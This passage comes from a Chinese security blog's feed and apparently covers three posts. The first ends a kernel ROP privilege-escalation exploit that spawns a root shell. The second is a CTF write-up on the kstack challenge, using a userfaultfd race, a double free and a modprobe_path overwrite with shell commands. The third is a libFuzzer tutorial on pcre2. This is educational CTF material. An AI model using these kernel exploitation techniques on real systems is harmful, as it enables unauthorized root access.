swapgs_restore_regs_and_ret_to_uspace;</span><br><span class="line">    rop[i++] = <span class="number">0xccdd</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x33333</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = (<span class="type">uint64_t</span>)safe_exit;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    <span class="built_in">write</span>(global_fd, rop, <span class="built_in">sizeof</span>(rop));</span><br><span class="line">    <span class="comment">// Should never be reached</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">safe_exit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> rax;</span><br><span class="line">    <span class="type">uint64_t</span> rbp;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov %%rax, %0\n\t&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        : <span class="string">&quot;=r&quot;</span>(rax), <span class="string">&quot;=r&quot;</span>(rbp)</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;returned from kernel: %lx\n&quot;</span>, rax);</span><br><span class="line">    <span class="keyword">if</span>(global_cstate == current_state_read_ksymtab_prepare_kernel_cred)&#123;</span><br><span class="line">        prepare_kernel_cred = ksymtab_prepare_kernel_cred + (<span class="type">int</span>)rax;</span><br><span class="line">        global_cstate = current_state_read_ksymtab_commit_creds;</span><br><span class="line">        <span class="built_in">read_address</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(global_cstate == current_state_read_ksymtab_commit_creds)&#123;</span><br><span class="line">        commit_creds = ksymtab_commit_creds + (<span class="type">int</span>)rax;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred: 0x%lx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;commit_creds : 0x%lx\n&quot;</span>, commit_creds);</span><br><span class="line">        global_cstate = current_state_escalate_privileges_stage1;</span><br><span class="line">        <span class="built_in">escalate_privileges</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(global_cstate == current_state_escalate_privileges_stage1)&#123;</span><br><span class="line">        creds_struct_va = rax;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;creds_struct_va: 0x%lx\n&quot;</span>, creds_struct_va);</span><br><span class="line">        global_cstate = current_state_escalate_privileges_stage2;</span><br><span class="line">        <span class="built_in">escalate_privileges</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(global_cstate == current_state_escalate_privileges_stage2)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">getuid</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Flag: \n&quot;</span>);</span><br><span class="line">            FILE *f = <span class="built_in">fopen</span>(<span class="string">&quot;/dev/sda&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="built_in">fread</span>(flag_buf, <span class="number">1</span>, <span class="built_in">sizeof</span>(flag_buf), f);</span><br><span class="line">            <span class="built_in">puts</span>(flag_buf);</span><br><span class="line">            <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;not root yet\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save_state</span>();</span><br><span class="line">    global_fd = <span class="built_in">open_dev</span>();</span><br><span class="line">    <span class="built_in">get_gadget_offset</span>();</span><br><span class="line">    global_cstate = current_state_read_ksymtab_prepare_kernel_cred;</span><br><span class="line">    <span class="built_in">read_address</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/">https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/</a><br><a href="https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/">https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel_pwn userfaultfd</title>
      <link href="/2021/01/14/kernel_pwn(userfaultfd)/"/>
      <url>/2021/01/14/kernel_pwn(userfaultfd)/</url>
      
        <content type="html"><![CDATA[<h3 id="kernel-pwn-userfaultfd"><a href="#kernel-pwn-userfaultfd" class="headerlink" title="kernel_pwn userfaultfd"></a>kernel_pwn userfaultfd</h3><blockquote><p>userfaultfd的利用姿势是在realworld ctf的议题直播里跟着BrieflyX大佬学习的，对该方法很是好奇，赛后就调了下kstack。</p></blockquote><span id="more"></span><p>userfaultfd是种page fault的处理方式。正常发生页缺失会引发异常，交给内核里的异常处理程序去解决，但userfaulted是让用户态的程序去处理自己的page fault。<br>userfaultfd具体的工作流程以及实现机制在<a href="http://brieflyx.me/2020/linux-tools/userfaultfd-internals/">BrieflyX的博客</a>里讲的很清楚了，我主要记录下做kstack的过程来加深对该机制的理解。</p><p>kstack题目给出了源码，实现了push和pop操作，涉及的结构为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Element</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> owner;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> value;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">Element</span> *<span class="title">fd</span>;</span></span><br><span class="line">&#125; Element;</span><br></pre></td></tr></table></figure><p>owner标识所属进程的PID，value即存储的数据，fd指向下一个_Element结构体（以链表的方式组织）。</p><p>主要逻辑在<code>proc_ioctl()</code>函数里：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span> <span class="title">proc_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Element *tmp, *prev;</span><br><span class="line">  <span class="type">int</span> pid = <span class="built_in">task_tgid_nr</span>(current);</span><br><span class="line">  <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">  <span class="keyword">case</span> CMD_PUSH:</span><br><span class="line">    tmp = <span class="built_in">kmalloc</span>(<span class="built_in">sizeof</span>(Element), GFP_KERNEL);</span><br><span class="line">    tmp-&gt;owner = pid;</span><br><span class="line">    tmp-&gt;fd = head;</span><br><span class="line">    head = tmp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">copy_from_user</span>((<span class="type">void</span>*)&amp;tmp-&gt;value, (<span class="type">void</span>*)arg, <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>))) &#123;</span><br><span class="line">      head = tmp-&gt;fd;</span><br><span class="line">      <span class="built_in">kfree</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">case</span> CMD_POP:</span><br><span class="line">    <span class="keyword">for</span>(tmp = head, prev = <span class="literal">NULL</span>; tmp != <span class="literal">NULL</span>; prev = tmp, tmp = tmp-&gt;fd) &#123;</span><br><span class="line">      <span class="keyword">if</span> (tmp-&gt;owner == pid) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">copy_to_user</span>((<span class="type">void</span>*)arg, (<span class="type">void</span>*)&amp;tmp-&gt;value, <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)))</span><br><span class="line">          <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="keyword">if</span> (prev) &#123;</span><br><span class="line">          prev-&gt;fd = tmp-&gt;fd;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          head = tmp-&gt;fd;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">kfree</span>(tmp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (tmp-&gt;fd == <span class="literal">NULL</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑也比较简单了，push先kmalloc一个<code>sizeof(Element)</code>大小的内存，之后设置owner并通过头插法连入链表，之后调用<code>copy_from_user</code>从用户区域读入数据到value，然后把该结点删除并kfree。</p><p>pop的话从头部查找，找到属于该进程的结点，之后将该结点value拷贝到用户区域，然后把zhe该结点删除并kfree。</p><p>看起来逻辑没什么问题，但存在的一个问题是整个过程没有加锁，并且对结点的删除操作是在<code>copy_from_user()</code>和<code>copy_to_user()</code>之后的。</p><p>那么如果带着利用userfaultfd构造race的想法再看这个逻辑的话如果在push时执行到<code>copy_from_user()</code>，由于用户区域arg是需要userfaultfd的，则该线程就会阻塞在这里，此时交给用户态的<code>fault_handler_thread</code>线程处理。该线程是用户可控的，如果再控制该线程执行pop操作，此时就会将之前push的结点里的value拷贝到用户区域。</p><p>因此就要想办法使得push时kmalloc拿到的chunk对应结点value的位置存放有kernel里的地址，这里用到的一个方法时利用<code>shm_file_date</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该结构体总的大小和Element大小差不多，通过slab分配0x24大小的chunk存放。</p><p>通过调用<code>shmget</code>建立一个共享内存对象，并<code>shmat</code>将对象映射到调用进程的地址空间，之后通过<code>shmdt</code>删除，则<code>shm_file_data</code>也会被free，之后再通过push的kmalloc时就会拿到刚刚free的chunk，同时对应vaule的位置还残留着之前<code>struct ipc_namespace *ns</code>的内容，该指针一般指向存在了的general namespace，该地址时kernel的地址，从而配合上面的pop到达leak地址的效果。</p><p>这里也提一下如何创建并注册一个需要通过userfaultfd的对象：</p><p>创建一个userfaultfd对象：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(uffd == <span class="number">-1</span>)&#123;</span><br><span class="line">    errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">uffdio_api.api = UFFD_API;</span><br><span class="line">uffdio_api.features = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)&#123;</span><br><span class="line">    errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后mmap一块内存，mmap出来的内存只有在真正使用到时才会映射到物理内存，因此对mmap出来内存的第一个r&#x2F;w操作会触发page fault。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">len = <span class="number">4</span> * page_size;</span><br><span class="line">addr = mmap(<span class="literal">NULL</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(addr == MAP_FAILED)&#123;</span><br><span class="line">    errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将区域注册为userfaultfd处理机制:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)addr;</span><br><span class="line">uffdio_register.range.len = len;</span><br><span class="line">uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">ioctl</span>(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="built_in">errExit</span>(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>leak完地址后继续利用userfaultfd的机制，pop一个需要userfaultfd的内存，在执行到<code>copy_to_user()</code>时阻塞，此时在<code>fault_handler_thread</code>线程中再执行一次pop，由于删除操作还未执行，因此处理的是同一个结点，在handler线程里将该结点删除后唤醒阻塞在<code>copy_to_user()</code>的线程继续执行删除操作，就会导致一个结点被free两次造成<code>double free</code>。</p><p>有了地址和<code>double free</code>接下来就是想办法提权或拿flag了。要利用<code>double free</code>的话要想办法修改chunk的前8个字节为目的地址，仅仅通过push的kmalloc是无法实现的这里用到了<code>userfaultfd + setxattr</code>的组合拳。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span></span><br><span class="line"><span class="params"><span class="function">         <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">int</span> error;</span><br><span class="line">        <span class="type">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">void</span> *vvalue = <span class="literal">NULL</span>;    <span class="comment">/* If non-NULL, we used vmalloc() */</span></span><br><span class="line">        <span class="type">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">        error = <span class="built_in">strncpy_from_user</span>(kname, name, <span class="built_in">sizeof</span>(kname));</span><br><span class="line">        <span class="keyword">if</span> (error == <span class="number">0</span> || error == <span class="built_in">sizeof</span>(kname))</span><br><span class="line">                error = -ERANGE;</span><br><span class="line">        <span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (size) &#123;</span><br><span class="line">                <span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)</span><br><span class="line">                        <span class="keyword">return</span> -E2BIG;</span><br><span class="line">[<span class="number">1</span>]             kvalue = <span class="built_in">kmalloc</span>(size, GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">                <span class="keyword">if</span> (!kvalue) &#123;</span><br><span class="line">                        vvalue = <span class="built_in">vmalloc</span>(size);</span><br><span class="line">                        <span class="keyword">if</span> (!vvalue)</span><br><span class="line">                                <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">                        kvalue = vvalue;</span><br><span class="line">                &#125;</span><br><span class="line">[<span class="number">2</span>]             <span class="keyword">if</span> (<span class="built_in">copy_from_user</span>(kvalue, value, size)) &#123;</span><br><span class="line">                        error = -EFAULT;</span><br><span class="line">                        <span class="keyword">goto</span> out;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">                    (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line">                        <span class="built_in">posix_acl_fix_xattr_from_user</span>(kvalue, size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        error = <span class="built_in">vfs_setxattr</span>(d, kname, kvalue, size, flags);</span><br><span class="line">out:</span><br><span class="line">        <span class="keyword">if</span> (vvalue)</span><br><span class="line">                <span class="built_in">vfree</span>(vvalue);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">[<span class="number">7</span>]             <span class="built_in">kfree</span>(kvalue);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>setxattr</code>源码里注意到[1]处kmalloc一个可控size的chunk，之后将value内容的size长度拷贝到kmalloc申请的chunk里，如果value处于两个页的交汇处，即value的内容在一个正常的页面的末尾，而在<code>size-value_size</code>的部分在下一个页面，而该页面会触发<code>page fault且</code>被注册为userfaultfd，则会导致在执行[2]<code>copy_from_user()</code>时，处于正常页面的<code>value_size</code>的内容会被正常拷贝，而之后到下一个页面时会触发userfaulted交给<code>handler_thread</code>处理。</p><p>这里BrieflyX拿flag的方法是将<code>modprobe_path - 8</code>的地址放在一个页的最后8个字节位置上，下一个页注册为userfaulted。</p><p>之后通过setxattr()修改double free的chunk头八个字节为<code>modprobe_path - 8</code>的地址，之后在handler_thread线程里利用两次push取出<code>modprobe_path - 8</code>的内存，并修改<code>modprobe_path</code>为<code>/tmp/x</code>。</p><p>x文件内容提前被设置<code>system(&quot;echo -ne &#39;#!/bin/sh\n/bin/chmod 777 /flag&#39; &gt; /tmp/x &quot;);system(&quot;chmod +x /tmp/x&quot;);</code>，modprobe_path其实就是一个文件路径的字符串，该文件在系统试图执行一个无法执行（除elf和shell脚本#!）的程序后执行。</p><p>因此提前设置一个无法识别执行的脚本<code>system(&quot;echo -ne &#39;\\xff\\xff\\xff\\xff&#39; &gt; /tmp/dummy&quot;);system(&quot;chmod +x /tmp/dummy&quot;);</code>。</p><p>此时执行dummy文件，系统会报错，接着便会执行<code>modprobe_path</code>的x文件，从而修改flag权限为777，之后<code>system(&quot;cat /flag&quot;)</code>拿到flag。</p><p>userfaultfd就像是在<code>copy_to/from_user()</code>处下了断点，形成一个稳定的race窗口，具有较强的通用型，这里的重点在于<code>handler_thread</code>的构造，如何区分不同的情况并进行相应配合的操作。我也是看的BrieflyX大佬的<a href="https://github.com/BrieflyX/ctf-pwns/blob/master/kernel/kstack/exp.c">exp</a>学习的。</p><p>参考：</p><p><a href="http://brieflyx.me/2020/linux-tools/userfaultfd-internals/">http://brieflyx.me/2020/linux-tools/userfaultfd-internals/</a></p><p><a href="https://www.bilibili.com/video/BV1qi4y1F7F1">https://www.bilibili.com/video/BV1qi4y1F7F1</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（转）LibFuzzer workshop学习之路（三）</title>
      <link href="/2021/01/06/libfuzzer3/"/>
      <url>/2021/01/06/libfuzzer3/</url>
      
        <content type="html"><![CDATA[<p>文章首发于安全客，由安全客原创发布：<a href="https://www.anquanke.com/post/id/227394">https://www.anquanke.com/post/id/227394</a></p><h3 id="libfuzzer-workshop学习之路（三）"><a href="#libfuzzer-workshop学习之路（三）" class="headerlink" title="libfuzzer workshop学习之路（三）"></a>libfuzzer workshop学习之路（三）</h3><blockquote><p>workshop一共给出了11个lesson，每一个lesson都会涉及到一些新的东西，这篇以最后的两个案例(对re2和pcre2的fuzz)为例，会涉及到一些链接库的选择以及插桩编译时的一些参数的设置，还有max_len的设置对我们最后fuzz结果的影响。</p></blockquote><span id="more"></span><h4 id="fuzzing-pcre2"><a href="#fuzzing-pcre2" class="headerlink" title="fuzzing pcre2"></a>fuzzing pcre2</h4><p>pcre2:<code>Perl Compatible Regular Expressions Version 2</code>(Perl兼容的正则表达式)即是一个C语言编写的正则表达式函数库，被很多开源软件所使用比如PHP，Apache，Nmap等。<br>workshop提供的pcre2版本是10.00，先进行源码编译工作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar xzf pcre2-10.00.tgz</span><br><span class="line">cd pcre2-10.00</span><br><span class="line"></span><br><span class="line">./autogen.sh</span><br><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;</span><br><span class="line">CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \</span><br><span class="line">    CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot;  ./configure --enable-never-backslash-C \</span><br><span class="line">    --with-match-limit=1000 --with-match-limit-recursion=1000</span><br><span class="line">make -j</span><br></pre></td></tr></table></figure><p>这里的一些插桩的参数和进阶篇的差不多，要注意的编译选项是<code>fuzzer-no-link</code>，如果修改大型项目的CFLAGS，它也需要编译自己的主符号的可执行文件，则可能需要在不链接的情况下仅请求检测，即<code>fuzzer-no-link</code>强制在链接阶段不生效。因此当我在插桩编译一个较大的开源库的时候推荐加上这个选项，如果不加的话fuzz效率如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#2INITED cov: 7 ft: 8 corp: 1/1b exec/s: 0 rss: 27Mb</span><br><span class="line">#3NEW    cov: 9 ft: 10 corp: 2/5b lim: 4 exec/s: 0 rss: 27Mb L: 4/4 MS: 1 CrossOver-</span><br><span class="line">#7REDUCE cov: 9 ft: 10 corp: 2/3b lim: 4 exec/s: 0 rss: 28Mb L: 2/2 MS: 4 ChangeByte-CrossOver-ChangeBinInt-EraseBytes-</span><br><span class="line">#35REDUCE cov: 10 ft: 11 corp: 3/5b lim: 4 exec/s: 0 rss: 28Mb L: 2/2 MS: 3 CopyPart-ChangeByte-EraseBytes-</span><br><span class="line">#146REDUCE cov: 10 ft: 11 corp: 3/4b lim: 4 exec/s: 0 rss: 28Mb L: 1/2 MS: 1 EraseBytes-</span><br><span class="line">#1491REDUCE cov: 16 ft: 17 corp: 4/21b lim: 17 exec/s: 0 rss: 28Mb L: 17/17 MS: 5 ChangeBit-ShuffleBytes-InsertRepeatedBytes-ChangeBit-CrossOver-</span><br><span class="line">#1889REDUCE cov: 16 ft: 17 corp: 4/20b lim: 17 exec/s: 0 rss: 28Mb L: 16/16 MS: 3 ShuffleBytes-CopyPart-EraseBytes-</span><br><span class="line">#524288pulse  cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 87381 rss: 830Mb</span><br><span class="line">#1048576pulse  cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 104857 rss: 830Mb</span><br><span class="line">#2097152pulse  cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 123361 rss: 830Mb</span><br><span class="line">#4194304pulse  cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 127100 rss: 830Mb</span><br><span class="line">#8388608pulse  cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 131072 rss: 830Mb</span><br></pre></td></tr></table></figure><p>另外，在执行configure生成makefile时针对pcre2添加了一些参数：<br><code>--with-match-limit=1000</code>:限制一次匹配时使用的资源数为1000,默认值为10000000<br><code>--with-match-limit-recursion=1000</code>:限制一次匹配时的递归深度为1000,默认为10000000(几乎可以说是无限)<br><code>--enable-never-backslash-C</code>:禁用在字符串中，将反斜线作为转义序列接受。</p><p>编译好开源库后就要研究harness了，workshop提供的如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pcre2posix.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">using <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="type">regex_t</span> 